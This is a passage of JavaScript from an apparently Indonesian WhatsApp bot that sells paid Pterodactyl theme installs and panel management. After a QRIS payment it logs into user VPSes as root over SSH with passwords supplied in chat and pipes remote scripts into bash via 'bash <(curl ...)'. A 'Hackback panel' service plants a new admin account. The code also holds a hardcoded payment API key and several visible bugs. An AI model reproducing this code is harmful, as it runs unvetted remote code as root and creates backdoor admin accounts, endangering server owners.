 await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
 db.users[m.sender].status_deposit = false;
 await clearInterval(db.users[m.sender].saweria.exp);
 delete db.users[m.sender].saweria;
 }
 }, 300000); // 5 menit
 }
 };

  await db.users[m.sender].saweria.exp();

  while (db.users[m.sender].status_deposit) {
    await sleep(8000);
    const resultcek = await axios.get(`https://rafaelxd.tech/api/orkut/cekstatus?apikey=rafael&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
    const req = await resultcek.data.amount;
    if (req == db.users[m.sender].saweria.amount) {
      db.users[m.sender].status_deposit = false;

      const connSettings = {
        host: global.installtema.vps,
        port: '22',
        username: 'root',
        password: global.installtema.pwvps,
      };

      const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;
      const ress = new Client();

      ress.on('ready', () => {
        Reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selesai.");
        ress.exec(command, (err, stream) => {
          if (err) throw err;
          stream.on('close', async (code, signal) => { 
            await Reply("Berhasil install *tema enigma* pterodactyl ✅");
            ress.end();
          }).on('data', async (data) => {
            console.log(data.toString());
            stream.write(`skyzodev\n`); // Key Token : skyzodev
            stream.write('1\n');
            stream.write('3\n');
            stream.write('https://wa.me/6285624297893\n');
            stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s\n');
            stream.write('https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy\n');
            stream.write('yes\n');
            stream.write('x\n');
          }).stderr.on('data', (data) => {
            console.log('STDERR: ' + data);
          });
        });
      }).on('error', (err) => {
        console.log('connection Error: ' + err);
        Reply('Kata sandi atau IP VPS tidak valid.');
      }).connect(connSettings);

      await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi tema..." }, { quoted: db.users[m.sender].saweria.msg });
      delete db.users[m.sender].saweria;
    }
  }
}
break;

case "jasainstalltemanightcore": {
    if (!m.isGroup) return Reply("Instalasi tema hanya dapat dilakukan melalui private chat.");
    if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    const UrlQr = global.qrisOrderKuota;

    function generateRandomNumber(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    let amount = 5000 + generateRandomNumber(110, 250); // Harga tema ditambah angka unik
    const get = await axios.get(`https://rafaelxd.tech/api/orkut/createpayment?apikey=rafael&amount=${amount}&codeqr=${UrlQr}}`);
    const teksPembayaran = `
*▧ INFORMASI PEMBAYARAN*

*• ID :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Barang :* Tema Nightcore Pterodactyl
*• Expired :* 5 menit

*Note :*
QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.
`;

let msgQr = await Nvidia.sendMessage(m.chat, {
 footer: `© 2025 ${botname}`,
 buttons: [
 {
 buttonId: `.batalbeli`,
 buttonText: { displayText: 'Batalkan Pembelian' },
 type: 1
 }
 ],
 headerType: 1,
 viewOnce: true,
 image: {url: get.data.result.qrImageUrl}, 
 caption: teks3,
 contextInfo: {
 mentionedJid: [m.sender]
 },
})
 db.users[m.sender].status_deposit = true;
 db.users[m.sender].saweria = {
 msg: msgQr,
 chat: m.sender,
 idDeposit: get.data.result.transactionId,
 amount: get.data.result.amount.toString(),
 exp: function () {
 setTimeout(async () => {
 if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
 await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: "⚠️ Waktu pembayaran telah expired, transaksi dibatalkan!"}, {quoted: db.users[m.sender].saweria.msg});
 await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
 db.users[m.sender].status_deposit = false;
 await clearInterval(db.users[m.sender].saweria.exp);
 delete db.users[m.sender].saweria;
 }
 }, 300000); // 5 menit
 }
 };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://rafaelxd.tech/api/orkut/cekstatus?apikey=rafael&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;

            const connSettings = {
                host: global.installtema.vps,
                port: '22',
                username: 'root',
                password: global.installtema.pwvps,
            };

            const command = `bash <(curl https://raw.githubusercontent.com/NoPro200/Pterodactyl_Nightcore_Theme/main/install.sh)`;
            const ress = new Client();

            ress.on('ready', () => {
                Reply("Memproses install *tema nightcore* pterodactyl\nTunggu 1-10 menit hingga proses selesai.");
                ress.exec(command, (err, stream) => {
                    if (err) throw err;
                    stream.on('close', async (code, signal) => { 
                        await Reply("Berhasil install *tema nightcore* pterodactyl ✅");
                        ress.end();
                    }).on('data', async (data) => {
                        console.log(data.toString());
                        stream.write('1\n'); // Pilihan instalasi
                        stream.write('y\n'); // Konfirmasi instalasi
                    }).stderr.on('data', (data) => {
                        console.log('STDERR: ' + data);
                    });
                });
            }).on('error', (err) => {
                console.log('connection Error: ' + err);
                Reply('Kata sandi atau IP VPS tidak valid.');
            }).connect(connSettings);

            await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi tema..." }, { quoted: db.users[m.sender].saweria.msg });
            delete db.users[m.sender].saweria;
        }
    }
}
break;

case "jasainstalltemaelysium": {
  if (!m.isGroup) return Reply("Instalasi tema hanya dapat dilakukan melalui private chat.");
  if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  const UrlQr = global.qrisOrderKuota;

  function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }

  let amount = 5000 + generateRandomNumber(110, 250); // Harga tema ditambah angka unik
  const get = await axios.get(`https://rafaelxd.tech/api/orkut/createpayment?apikey=rafael&amount=${amount}&codeqr=${UrlQr}}`);
  const teksPembayaran = `
*▧ INFORMASI PEMBAYARAN*

*• ID :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Barang :* Tema Elysium Pterodactyl
*• Expired :* 5 menit

*Note :*
QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.
`;
let msgQr = await Nvidia.sendMessage(m.chat, {
 footer: `© 2025 ${botname}`,
 buttons: [
 {
 buttonId: `.batalbeli`,
 buttonText: { displayText: 'Batalkan Pembelian' },
 type: 1
 }
 ],
 headerType: 1,
 viewOnce: true,
 image: {url: get.data.result.qrImageUrl}, 
 caption: teks3,
 contextInfo: {
 mentionedJid: [m.sender]
 },
})
 db.users[m.sender].status_deposit = true;
 db.users[m.sender].saweria = {
 msg: msgQr,
 chat: m.sender,
 idDeposit: get.data.result.transactionId,
 amount: get.data.result.amount.toString(),
 exp: function () {
 setTimeout(async () => {
 if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
 await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: "⚠️ Waktu pembayaran telah expired, transaksi dibatalkan!"}, {quoted: db.users[m.sender].saweria.msg});
 await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
 db.users[m.sender].status_deposit = false;
 await clearInterval(db.users[m.sender].saweria.exp);
 delete db.users[m.sender].saweria;
 }
 }, 300000); // 5 menit
 }
 };

  await db.users[m.sender].saweria.exp();

  while (db.users[m.sender].status_deposit) {
    await sleep(8000);
    const resultcek = await axios.get(`https://rafaelxd.tech/api/orkut/cekstatus?apikey=rafael&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
    const req = await resultcek.data.amount;
    if (req == db.users[m.sender].saweria.amount) {
      db.users[m.sender].status_deposit = false;

      const connSettings = {
        host: global.installtema.vps,
        port: '22',
        username: 'root',
        password: global.installtema.pwvps,
      };

      const command = `bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/kontol/refs/heads/main/bangke.sh)`;
      const ress = new Client();

      ress.on('ready', () => {
        Reply("Memproses install *tema Elysium* pterodactyl\nTunggu 1-10 menit hingga proses selesai.");
        ress.exec(command, (err, stream) => {
          if (err) throw err;
          stream.on('close', async (code, signal) => { 
            await Reply("Berhasil install *tema Elysium* pterodactyl ✅");
            ress.end();
          }).on('data', async (data) => {
            console.log(data.toString());
            stream.write('1\n');
            stream.write('y\n');
            stream.write('yes\n');
          }).stderr.on('data', (data) => {
            console.log('STDERR: ' + data);
          });
        });
      }).on('error', (err) => {
        console.log('connection Error: ' + err);
        Reply('Kata sandi atau IP VPS tidak valid.');
      }).connect(connSettings);

      await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi tema..." }, { quoted: db.users[m.sender].saweria.msg });
      delete db.users[m.sender].saweria
    }
  }
}
break;

case "jasainstalltema": {
 if (!text || !text.split("|")) return Reply(example("ipvps|pwvps"))
 let vii = text.split("|")
 if (vii.length < 2) return Reply(example("ipvps|pwvps"))
 global.installtema = {
 vps: vii[0], 
 pwvps: vii[1]
 }
{
  const emojis = ['🔥', '🐟', '✅'];
  let count = 0;
  
  // Get the sender's pushname (display name)
  const pushname = m.pushname || 'User';  // Use 'User' as fallback if pushname is not available

  const sendEmojiReactions = async () => {
    if (count < 3) {
      await Nvidia.sendMessage(m.chat, {
        react: {
          text: emojis[count % emojis.length],
          key: m.key,
        },
      });

      count++;
      setTimeout(sendEmojiReactions, 100);
    } else {
      let menu = `*_Silahkan Memilih Install Menu Di Bawah Ini_*`;

      let buttons = [
        { buttonId: ".buyscript", buttonText: { displayText: "Buy Script?" } },
        { buttonId: ".owner", buttonText: { displayText: "Owner" } }
      ];

      let buttonMessage = {
        image: {
          url: "https://img101.pixhost.to/images/663/558997925_fr3hosting.jpg",
          gifPlayback: true,
        },
        caption: `${menu}`,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: global.idSaluran,
            newsletterName: `FR3hosting`
          }
        },
        footer: "FR3hosting",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
      };

      const flowActions = [
        {
          buttonId: 'action',
          buttonText: { displayText: 'This Button List' },
          type: 4,
          nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
              title: "INSTALL MENU >_<",
              sections: [
                {
                  title: "SILAHKAN PILIH MENU INSTALL DI BAWAH INI",
                  highlight_label: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ FR3hosting",
                  rows: [
                    { title: "Jasa Install Nebula", description: "Rp 5000", id: ".jasainstalltemanebula" },
                    { title: "Jasa Install Depend", description: "Rp 0", id: ".jasainstalldepend" },
                    { title: "Jasa Install Engigma", description: "Rp 5000", id: ".jasainstalltemaenigma" },
                    { title: "Jasa Install Nightcore", description: "Rp 5000", id: ".jasainstalltemanightcore" },
                    { title: "Jasa Install Elsyium", description: "Rp 5000", id: ".jasainstalltemaelysium" },
                    { title: "INS panel", description: "", id: ".installpanel" },
                    { title: "UN tema", description: "", id: ".uninstalltema" },
                   
                  ]
                }
              ]
            })
          },
          viewOnce: true
        }
      ];

      buttonMessage.buttons.push(...flowActions);

      await Nvidia.sendMessage(m.chat, buttonMessage, { quoted: qlive }); // Use `m` here instead of `fkontak`
    }
  }

  sendEmojiReactions();
};
break;
}

case "jasahbpanel": {
  if (!m.isGroup) return Reply("Jasa Hackback panel hanya dapat dilakukan melalui private chat.");
  
  let t = text.split('|');
  if (t.length < 2) return Reply(example("ipvps|pwvps"));
  let ipvps = t[0];
  let passwd = t[1];
  
  if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  const UrlQr = global.qrisOrderKuota;

  function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }

  let amount = 5000 + generateRandomNumber(110, 250); // Harga tema ditambah angka unik
  const get = await axios.get(`https://rafaelxd.tech/api/orkut/createpayment?apikey=rafael&amount=${amount}&codeqr=${UrlQr}}`);
  
  const teks3 = `
  *▧ INFORMASI PEMBAYARAN*

  *• ID :* ${get.data.result.transactionId}
  *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
  *• Barang :* Hackback Panel
  *• Expired :* 5 menit

  *Note :*
  QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan proses hackback panel.
  `;

  let msgQr = await Nvidia.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
        db.users[m.sender].status_deposit = true;
        db.users[m.sender].saweria = {
            msg: msgQr,
            chat: m.sender,
            idDeposit: get.data.result.transactionId,
            amount: get.data.result.amount.toString(),
            exp: function () {
                setTimeout(async () => {
                    if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
                        await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: "⚠️ Waktu pembayaran telah expired, transaksi dibatalkan!"}, {quoted: db.users[m.sender].saweria.msg});
                        await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                        db.users[m.sender].status_deposit = false;
                        await clearInterval(db.users[m.sender].saweria.exp);
                        delete db.users[m.sender].saweria;
                    }
                }, 300000); // 5 menit
            }
        };

  await db.users[m.sender].saweria.exp();

  while (db.users[m.sender].status_deposit) {
    await sleep(8000);
    const resultcek = await axios.get(`https://rafaelxd.tech/api/orkut/cekstatus?apikey=rafael&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
    const req = await resultcek.data.amount;
    if (req == db.users[m.sender].saweria.amount) {
      db.users[m.sender].status_deposit = false;

      const ipvps = global.installtema.vps;
      const passwd = global.installtema.pwvps;

      const newuser = "brannbotz" + getRandom("");
      const newpw = "brannbotz" + getRandom("");

      const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
      };

      const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;
      const ress = new Client();

      ress.on('ready', () => {
        ress.exec(command, (err, stream) => {
          if (err) throw err;
          stream.on('close', async (code, signal) => {
            const teks = `
            *Hackback Panel Sukses ✅*

            *Berikut detail akun admin panel :*
            *• Username :* ${newuser}
            *• Password :* ${newpw}
            `;
            await Nvidia.sendMessage(m.chat, { text: teks }, { quoted: m });
            ress.end();
          }).on('data', async (data) => {
            console.log(data.toString());
            stream.write("skyzodev\n");
            stream.write("7\n");
            stream.write(`${newuser}\n`);
            stream.write(`${newpw}\n`);
          }).stderr.on('data', (data) => {
            console.log("STDERR: " + data);
          });
        });
      }).on('error', (err) => {
        console.log("connection Error: " + err);
        Reply("Kata sandi atau IP VPS tidak valid.");
      }).connect(connSettings);

      await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai proses hackback panel..." }, { quoted: db.users[m.sender].saweria.msg });
      delete db.users[m.sender].saweria;
    }
  }
}

break

case "slidemenu": case "menuslide": {
await menuslide(m.chat)
}
break

case "cekpanel": {
if (!text) return m.reply('*-# Masukkan Panel* ID\nContoh: .cekpanel 1234');
const panelId = text;

try {
const response = await fetch(`${global.domain}/api/application/servers`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${global.apikey}`
}
});

if (!response.ok) {
throw new Error(`Failed to fetch servers: ${response.status}`);
}
const resData = await response.json();

const server = resData.data.find(s => s.attributes.id === parseInt(panelId));

if (!server) {
return m.reply(`*🔴 -# Server Panel Id Tidak Valid ${panelId}*`);
}
const serverAttributes = server.attributes;
const usageResponse = await fetch(`${global.domain}/api/client/servers/${serverAttributes.uuid.split('-')[0]}/resources`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${global.capikey}`
}
});
if (!usageResponse.ok) {
throw new Error(`Failed to fetch resource usage: ${usageResponse.status}`);
}
const usageData = await usageResponse.json();
const formatSize = (size) => {
if (!size || size === 0) return "Unlimited";
if (size >= 1024) {
return `${Math.floor(size/1024)}GB`;
}
return `${size}MB`;
};
const formatCPU = (cpu) => {
return !cpu || cpu === 0 ? "Unlimited" : `${cpu}%`;
};
const formatNetworkSpeed = (bytes) => {
if (!bytes) return "0 KB/s";
const kb = bytes / 1024;
return `${kb.toFixed(2)} KB/s`;
};
const getStatus = (state) => {
const statusMap = {
'running': '🟢 Running',
'starting': '🟡 Starting',
'stopping': '🟡 Stopping',
'stopped': '🔴 Stopped',
'offline': '⚫ Offline'
};
return statusMap[state.toLowerCase()] || `❓ ${state}`;
};
let message = `📊 *-# Detail Server Panel Anda*
* *-# Nama:* ${serverAttributes.name}
* *-# Panel ID:* ${serverAttributes.id}\n
${getStatus(usageData.attributes.current_state)}

📊 *[ - ] Detail Resource Usage: [ - ]*
* *-# CPU:* ${formatCPU(serverAttributes.limits.cpu)}
* *-# RAM:* ${formatSize(serverAttributes.limits.memory)}
* *-# Disk:* ${formatSize(serverAttributes.limits.disk)}
* *-# Upload:* ${formatNetworkSpeed(usageData.attributes.resources.network_rx_bytes)}
* *-# Download:* ${formatNetworkSpeed(usageData.attributes.resources.network_tx_bytes)}

*[ - ] Jika Mau Cek Panel Anda Lagi silahkan : .cekpanel [ - ]*`;

await FRhost.sendMessage(m.chat, {image: {url: "https://i.postimg.cc/wvH7FBgQ/Warungerik.jpg" }, caption: message }, {quoted: qtext})

} catch (error) {
console.error('Error detail:', error);
return m.reply(`❌ Terjadi kesalahan: ${error.message}`);
}}
break

case "creatpanel-v3": case "cpanel-v3": {
if (!isCreator && !isPremium && !isAkses) return Reply(mess.owner)
if (text.includes(" ")) return m.reply("⚠️ Username tidak boleh mengandung spasi, coba lagi!");
if (!text) return m.reply(example("username"))
await Nvidia.sendMessage(m.chat, {
 footer: `© 2025 ${botname}`,
 buttons: [
 {
 buttonId: 'action',
 buttonText: { displayText: 'ini pesan interactiveMeta' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'PILIH',
 sections: [
 {
 title: 'List Panel',
 highlight_label: 'Recommended',
 rows: [
 {
 title: 'unlimited-v3',
 id: `.unli-v3 ${text}`
 },
 {
 title: '1GB-v3',
 id: `.1gb-v3 ${text}`
 }, 
 {
 title: '2GB-v3',
 id: `.2gb-v3 ${text}`
 }, 
 {
 title: '4GB-v3',
 id: `.4gb-v3 ${text}`
 }, 
 {
 title: '5GB-v3',
 id: `.5gb-v3 ${text}`
 },
 {
 title: '6GB-v3',
 id: `.6gb-v3 ${text}`
 }, 
 {
 title: '7GB-v3',
 id: `.7gb-v3 ${text}`
 }, 
 {
 title: '8GB-v3',
 id: `.8gb-v3 ${text}`
 }, 
 {
 title: '9GB-v3',
 id: `.9gb-v3 ${text}`
 }, 
 {
 title: '10GB-v3',
 id: `.10gb-v3 ${text}`
 } 
 ]
 }
 ]
 })
 }
 }
 ],
 headerType: 1,
 viewOnce: true,
 text: "PILIH RAM PANEL V3\n",
 contextInfo: {
 isForwarded: true, 
 mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
 },
}, {quoted: m})
}
break

case "1gb-v3": case "2gb-v3": case "3gb-v3": case "4gb-v3": case "5gb-v3": case "6gb-v3": case "7gb-v3": case "8gb-v3": case "9gb-v3": case "10gb-v3": case "unlimited-v3": case "unli-v3": {
if (!isCreator) return Reply(mess.owner)
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-V3") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-V3") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-V3") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-V3") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-V3") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-V3") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-V3") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-V3") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-V3") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-V3") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@fr3.com"
let name = capital(username) + " Server"
let password = username+"FR3"
let f = await fetch(global.domainV3 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(global.domainV3 + `/api/application/nests/${nestidV3}/eggs/` + eggV3, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(global.domainV3 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV3),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV3)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (!m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV3}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Nvidia.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

case "listadmin-v3": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(global.domainV3 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Nvidia.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin-V3`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

case "listpanel-v3": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(global.domainV3 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(global.domainV3 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV3
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await Nvidia.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

case "deladmin-v3": {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(global.domainV3 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return Nvidia.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qlive})
}
let cek = await fetch(global.domainV3 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(global.domainV3 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

case "delpanel-v3": {
if (!isCreator && !isPremium && !isAkses) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(global.domainV3 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(global.domainV3 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV3
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
